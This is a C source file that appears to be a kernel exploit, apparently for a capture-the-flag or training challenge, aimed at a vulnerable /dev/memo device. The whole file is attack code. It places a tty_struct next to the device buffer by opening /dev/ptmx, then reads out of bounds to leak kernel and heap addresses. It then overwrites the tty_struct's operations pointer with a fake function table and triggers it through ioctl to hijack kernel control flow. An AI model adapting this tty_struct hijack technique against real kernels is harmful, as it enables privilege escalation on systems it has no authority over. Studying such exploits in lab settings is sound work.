#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>



int main(void) {
    int fd, i;
    int ptmx_fd;

    if ((fd = open("/dev/memo", O_RDWR)) < 0) {
        perror("open");
        return 1;
    }
    // If the slub is clean, 2 continuous allocation will be adjacent
    if ((ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY)) < 0) {
        perror("open");
        return 1;
    }

    if (lseek(fd, 0x3f0, SEEK_SET) < 0) {
        perror("lseek");
        return 1;
    }

    char buf[0x1000];
    if (read(fd, buf, 0x400) < 0) {
        perror("read");
        return 1;
    }

    char *leaked = buf + 0x10;
    if (leaked[0] == 0x01 && leaked[1] == 0x54) {
        puts("[+] Leak success");
    } else {
        puts("[+] Leak failed");
        return 1;
    }

    unsigned long addr_kernel = *(unsigned long *)(leaked + 0x18) - 0x77ff81e65900;
    unsigned long addr_chunk = *(unsigned long *)(leaked + 0x38) - 0x38 - 0x400;
    printf("addr_kernel = %p\n", (void *)addr_kernel);
    printf("addr_chunk = %p\n", (void *)addr_chunk);

    unsigned long tty_operations[0x20];
    char tty_struct[0x2e0];
    unsigned long *org_tty_struct = (unsigned long *)leaked;
    memcpy(tty_struct, org_tty_struct, 24);
    memset(tty_operations, 0, sizeof(tty_operations));
    tty_operations[12] = 0xdeadbeef; // ioctl
    // tty_operations[31] = (unsigned long long)malloc(0x1000); // proc_fops
    *(unsigned long *)(tty_struct + 24) = addr_chunk; // tty_operations

    if (lseek(fd, 0x0, SEEK_SET) < 0) {
        perror("lseek");
        return 1;
    }
    if (write(fd, tty_operations, sizeof(tty_operations)) < 0) {
        perror("write");
        return 1;
    }

    if (lseek(fd, 0x3f0, SEEK_SET) < 0) {
        perror("lseek");
        return 1;
    }
    memcpy(buf + 0x10, tty_struct, 24 + 8);
    if (write(fd, buf, 0x10 + 0x18 + 0x8) < 0) {
        perror("write");
        return 1;
    }

    ioctl(ptmx_fd, 0xcafe, 0xbabe);

    return 0;
}
